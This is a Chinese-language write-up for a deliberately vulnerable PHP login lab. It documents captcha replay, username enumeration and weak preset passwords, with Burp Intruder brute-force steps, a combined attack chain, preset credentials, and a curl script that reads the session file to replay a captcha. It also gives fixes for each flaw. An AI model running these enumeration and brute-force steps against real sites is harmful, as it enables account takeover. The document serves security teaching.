## 0. 前置说明

- 登录表单提交到 `POST /login.php`，含 CSRF 隐藏域 `_csrf`。该令牌存放在会话中，**同一次会话内固定不变**，因此抓到的请求体可被反复重放。
- 验证码为 4 位数字，明文值存于 `$_SESSION['captcha']`，图片由 `/captcha.php` 动态生成输出（刷新次数不限）。
- 校验顺序：先验证码、后账号；**SQL 均使用预处理语句（无注入点）**，本靶场漏洞范围仅为下列三项。

---

## 1. 漏洞一 · 验证码重放

**漏洞位置**：[login.php](file:///workspace/login.php#L47-L64) 验证码校验段

**漏洞说明**
- 验证码校验通过后**不销毁** session 中的验证码，也**不设置过期时间**。
- 与安全实现对比：安全实现应“一次一用”——校验后立即 `unset($_SESSION['captcha'])` 或标记失效。
- 结果：一旦解出一次验证码，就可在后续**任意多次**登录尝试中重复提交同一值，验证码的防自动化作用失效。

**利用步骤（推荐 Burp Suite）**
1. 浏览器打开登录页，开启 Burp 拦截，填入任意用户名/密码与当前验证码，点击登录。
2. Burp 截获 `POST /login.php`，请求体中 `captcha` 与 `_csrf` 均可用。
3. 右键 → **Send to Repeater**；**保持 Body 中的 `captcha` 值不变**。
4. 在 Repeater 中反复修改 `username` / `password` 并 Send：验证码值不变，服务端始终接受 → 可无限次尝试。
5. 自动化：右键 → Send to **Intruder**，把 `password` 设为 payload 位置，`captcha` 固定不动，即可批量爆破。

> 注意：登录页现已改为 **AJAX 提交**（见协同文档 D-039）——失败时**不刷新页面**，验证码图片不会被重新请求，因此在**浏览器里直接反复提交同一枚验证码**即可复现重放，无需代理工具；若用代理工具（Burp / curl），保留原始请求同理。

**影响**：验证码失去防爆破能力，可与漏洞二、漏洞三组合做在线暴力破解。

## 2. 漏洞二 · 用户名探测

**漏洞位置**：[login.php](file:///workspace/login.php#L66-L87) + [auth.php](file:///workspace/includes/auth.php#L34-L66) 的 `find_user_by_username()`

**漏洞说明**
- 用户名不存在时返回 **“用户名不存在”**；口令错误时返回 **“密码错误”**，两种提示**明显不同**。
- 与安全实现对比：安全实现应统一返回“用户名或密码错误”，不泄露账号是否存在。
- 结果：攻击者可据返回文案判断某用户名是否为系统的真实账户。

**利用步骤**
1. Burp 抓取登录请求，固定 `captcha` 与 `_csrf`（配合漏洞一）。
2. 右键 → Send to **Intruder**，把 `username` 设为 payload，加载用户名字典。
3. 运行攻击并按响应比较：
   - 返回 **“用户名不存在”** → 该用户名无效；
   - 返回 **“密码错误”** → 该用户名**真实存在**（已进入口令校验阶段）。
4. 汇总所有返回“密码错误”的用户名，即得到**有效账户清单**。

**影响**：泄露账号是否存在，为后续口令爆破缩小范围、显著提高成功率。

## 3. 漏洞三 · 弱口令

**漏洞位置**：[config.php](file:///workspace/config.php#L34-L43) 预置账号；[login.php](file:///workspace/login.php) 无失败计数/锁定/频率限制；[captcha.php](file:///workspace/captcha.php) 无刷新限制

**漏洞说明**
- 预置弱口令账号：`admin/admin123`、`test/123456`、`user/password`（由 `init_db.php` 写入，bcrypt 存储）。
- 登录失败**不计数、无账户锁定、无频率限制**；验证码刷新也**无次数限制**。
- 与安全实现对比：安全实现应限制失败次数并触发锁定/延迟、对刷新做频率控制。

**利用步骤（组合攻击链）**
1. **探测用户名**（漏洞二）→ 得到有效用户名列表。
2. **固定验证码**（漏洞一）→ 用 Burp Repeater/Intruder 让 `captcha` 保持不变。
3. **爆破口令**（漏洞三）→ 对有效用户名用弱口令字典做 Intruder 攻击；服务端不计数、不锁定，可无限尝试。
4. 命中口令 → 登录成功 → 跳转 `admin.php`，页面显示“欢迎 xxx”。

**影响**：可直接获得后台账户，验证码、提示文案、失败限制三重防线同时失效。

## 4. 一键验证与修复对照（推荐 · 后台内置页面）

新增 [verify_vulns.php](file:///workspace/verify_vulns.php)：**登录后台后**，从左侧导航「漏洞验证」进入（未登录直接访问会被 302 弹回登录页）。页面按漏洞组织：**一个漏洞一张卡片**，另有一张**总结卡片**。

每张漏洞卡片里有三样东西：

- **测试漏洞**：在**当前开关状态**下用真实接口跑一遍该漏洞的攻击，结果写进卡片下方的「测试结果」；
- **一键修复**：把该漏洞切到「修复模式」（安全实现），并立即复测一次，展示同一次攻击已被拦住；
- **恢复靶场**：把该漏洞切回「靶场模式」。

三个开关**相互独立**，可自由组合（例如只修验证码重放、保留用户名探测）。「测试结果」含：结论（漏洞成立 / 未复现）、实测数据（同一枚验证码被接受的次数、两种失败的提示与耗时、是否触发锁定），以及每次真实请求的明细（参数 + HTTP 码 + 耗时 + 判读）。

总结卡片汇总三处漏洞的当前模式与最近测试结论，并提供「测试全部 / 一键修复全部 / 全部恢复靶场」，附组合攻击链与研究结论。

每张卡片内部分为**漏洞说明 / 代码对照 / 操作 / 测试结果**四段（小标题 + 分割线隔开），原始请求明细默认**折叠**。「代码对照」段完整展示两块源码节选（均取自真实文件）：**漏洞代码**（造成漏洞的原因，红色标头）与**修复代码**（修复模式的安全实现，绿色标头），等宽字体、自动折行。所有按钮都走 **AJAX**（与登录页同款「后端验证、前端不变」）：点击后按钮进入「切换中…」加载态，服务端处理完只就地更新对应卡片与总结，**页面不刷新**；禁用 JS 时回退为普通表单提交。

移动端窄屏下四张卡片**横向滑动**查看（`.lab-swipe` 容器：`scroll-snap-type: x mandatory` 原生吸附翻卡，每张卡占 88% 宽，上方有「← 左右滑动」提示行；纯 CSS 实现，无 JS、无自动滚动，AJAX 就地刷新不改变横滑位置）。PC 端与移动端宽窗口仍为竖排堆叠。

它**不模拟、不造假**，而是走真实接口：先用 `/captcha.php` 真实生成一枚验证码，再用**同一枚验证码**重复 POST 到 `/login.php`，并把服务端真实返回的提示读回来逐项判定：

- 前置：`/captcha.php` 生成验证码（本轮那枚码原样展示）
- 基线：故意用错误码 → 必须提示“验证码错误”（避免自证循环）
- 漏洞一：同一枚码连续提交 3 次，验证码关卡 3/3 放行
- 漏洞二：不存在的用户 →“用户名不存在”；存在的用户 + 错口令 →“密码错误”
- 漏洞三：`admin / admin123` → 登录成功，302 跳转 `/admin.php`

本机实测输出：

```text
验证结论：三处漏洞均实际存在且可复现
前置：/captcha.php 真实生成验证码：本轮验证码 = 3635（后续所有尝试固定用它）
基线：错误验证码被拒绝：错误码 0000 → 服务端提示「验证码错误」
漏洞一 · 验证码重放：同一枚验证码 3635 连续提交 3 次，通过验证码关卡的次数 = 3 / 3
     明细：用户名不存在 → 密码错误 → 302 登录成功
漏洞二 · 用户名探测：不存在的用户 nosuchuser → 「用户名不存在」；存在的用户 admin + 错口令 → 「密码错误」
漏洞三 · 弱口令：admin / admin123 → 登录成功，跳转 /admin.php

原始请求明细（真实 POST /login.php）
基线：错误验证码：        username=nosuchuser&password=x&captcha=0000       → HTTP 302 跳转 /index.php，提示「验证码错误」
重放①：不存在的用户：      username=nosuchuser&password=x&captcha=3635       → HTTP 302 跳转 /index.php，提示「用户名不存在」
重放②：存在的用户+错口令：  username=admin&password=wrongpw&captcha=3635      → HTTP 302 跳转 /index.php，提示「密码错误」
重放③：预置弱口令（末次成功）：username=admin&password=admin123&captcha=3635 → HTTP 302 跳转 /admin.php
```

> 该页只是验证工具，**不会修补**任何漏洞。它的攻击请求在**独立的一次性会话**中发起（因为 `login_user()` 会 `session_regenerate_id(true)`，共用会话会把正在浏览的管理员踢下线），因此**不影响你当前的后台登录状态**，可放心反复刷新验证。

## 4.1 手工复现（curl · Linux / 沙箱）

思路：先用 `curl` 建立会话并取到会话中的验证码明文（靶场为本地，可直接读 PHP session 文件），随后**复用同一验证码**提交多次。

```bash
J=/tmp/jar.txt
B=http://127.0.0.1:8080                       # 改成你的地址（phpStudy 2016 一般是 http://localhost）
SD=$(php -r 'echo ini_get("session.save_path") ?: sys_get_temp_dir();')   # 自动探测 session 目录
rm -f $J
curl -s -c $J -b $J -o /tmp/i.html "$B/index.php"
SID=$(awk '$6=="BLOGSESSID"{print $7}' $J | tail -n1)
curl -s -c $J -b $J -o /dev/null "$B/captcha.php"
CODE=$(tr ';' '\n' < "$SD/sess_$SID" | sed -n 's/.*captcha|s:4:"\([0-9]\{4\}\)".*/\1/p')
TOKEN=$(sed -n 's/.*name="_csrf" value="\([a-f0-9]*\)".*/\1/p' /tmp/i.html | head -n1)

# 复用同一个 CODE 提交多次（验证码不被消耗 → 重放成立）
curl -s -c $J -b $J -o /dev/null --data-urlencode "_csrf=$TOKEN" \
  --data-urlencode "username=nosuchuser" --data-urlencode "password=x" \
  --data-urlencode "captcha=$CODE" "$B/login.php"      # → 提示“用户名不存在”
curl -s -c $J -b $J -o /dev/null --data-urlencode "_csrf=$TOKEN" \
  --data-urlencode "username=admin" --data-urlencode "password=wrong" \
  --data-urlencode "captcha=$CODE" "$B/login.php"      # → 提示“密码错误”
curl -s -c $J -b $J -o /dev/null --data-urlencode "_csrf=$TOKEN" \
  --data-urlencode "username=admin" --data-urlencode "password=admin123" \
  --data-urlencode "captcha=$CODE" "$B/login.php"      # → 登录成功（同一验证码第 3 次复用）
```

实测结果：同一验证码连续复用 3 次均被接受——错误验证码提示“验证码错误”、不存在用户提示“用户名不存在”、错密码提示“密码错误”、正确口令登录成功并显示“欢迎 admin”。

> **`SD` 必须填对**：本机若报 `No such file or directory`，说明 session 目录猜错了——用上面的 `php -r` 自动探测即可（沙箱为 `/tmp`；phpStudy 2016 on Windows 一般是 `php.ini` 中 `session.save_path` 指向的目录，例如 `...\PHPTutorial\tmp\temp`）。

## 5. 防御要点（对照学习）

| 漏洞 | 正确做法 |
| --- | --- |
| 验证码重放 | 验证码**一次一用**：校验后立即销毁或标记失效，并设置有效期 |
| 用户名探测 | 登录失败**统一提示**“用户名或密码错误”，不区分账号是否存在 |
| 弱口令 | 强制口令强度（长度/复杂度/黑名单）、失败次数限制与账户锁定、登录与验证码刷新频率限制 |
